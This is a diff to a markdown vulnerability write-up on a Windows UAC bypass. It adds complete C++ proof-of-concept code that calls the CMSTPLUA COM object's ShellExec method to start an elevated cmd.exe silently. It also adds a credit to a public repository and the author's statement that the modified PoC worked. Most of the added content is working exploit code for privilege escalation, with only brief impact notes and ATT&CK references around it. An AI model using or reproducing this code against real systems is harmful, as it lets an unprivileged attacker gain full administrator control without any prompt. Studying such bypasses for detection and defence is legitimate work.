@@ -122,6 +122,83 @@ To bypass the UAC prompt and achieve silent elevation:
 > Since the custom binary inherits elevation from fodhelper.exe, calling CoCreateInstance and ShellExec() does not trigger a UAC prompt. The entire chain executes silently with elevated privileges.
 
 
+```c
+#include <Windows.h>
+#include <atlbase.h>
+#include <shlobj.h>
+#include <shellapi.h>
+#include <iostream>
+
+#pragma comment(lib, "shell32.lib")
+
+const wchar_t* CLSID_CMSTPLUA = L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
+const wchar_t* IID_ICMLuaUtil = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
+
+struct ICMLuaUtil : public IUnknown {
+    virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
+    virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
+    virtual HRESULT STDMETHODCALLTYPE ShellExec(
+        LPCWSTR lpFile,
+        LPCWSTR lpParameters,
+        LPCWSTR lpDirectory,
+        ULONG fMask,
+        ULONG nShow) = 0;
+};
+
+int injector() {
+    HRESULT hr = CoInitialize(NULL);
+    if (FAILED(hr)) {
+        std::wcout << L"CoInitialize failed: " << std::hex << hr << std::endl;
+        return -1;
+    }
+
+    CLSID clsid;
+    IID iid;
+
+    if (FAILED(CLSIDFromString(CLSID_CMSTPLUA, &clsid))) {
+        std::wcout << L"CLSIDFromString failed\n";
+        CoUninitialize();
+        return -1;
+    }
+    if (FAILED(IIDFromString(IID_ICMLuaUtil, &iid))) {
+        std::wcout << L"IIDFromString failed\n";
+        CoUninitialize();
+        return -1;
+    }
+
+    CComPtr<ICMLuaUtil> spLuaUtil;
+    hr = CoCreateInstance(clsid, nullptr, CLSCTX_INPROC_SERVER, iid, (void**)&spLuaUtil);
+    if (SUCCEEDED(hr) && spLuaUtil) {
+        hr = spLuaUtil->ShellExec(
+            L"C:\\Windows\\System32\\cmd.exe",
+            nullptr,
+            nullptr,
+            SEE_MASK_DEFAULT,
+            SW_SHOW);
+        if (FAILED(hr)) {
+            std::wcout << L"ShellExec failed: " << std::hex << hr << std::endl;
+        }
+    }
+    else {
+        std::wcout << L"CoCreateInstance failed: " << std::hex << hr << std::endl;
+    }
+
+    CoUninitialize();
+    return 0;
+}
+
+int main() {
+    injector();
+    MessageBoxW(nullptr, L"Done", L"Info", MB_OK);
+    return 0;
+}
+
+```
+
 
 ---
 #### **Impact**
@@ -153,7 +230,11 @@ An unprivileged attacker can elevate to administrator silently, gaining full con
 - MITRE ATT&CK T1559.001 :Inter-Process Communication: Component Object Model
 
 
+With special thanks to Tijme Gommers for his excellent repository:
+https://github.com/tijme/cmstplua-uac-bypass
 
+I slightly modified the original PoC code, tested it in my environment, and successfully achieved a UAC bypass.
 
-
+>  Technical note:
+> The modifications were minimal but critical for my target setup. The PoC demonstrates how the CMSTPLUA auto-elevation > mechanism can be abused to silently escalate privileges.
 
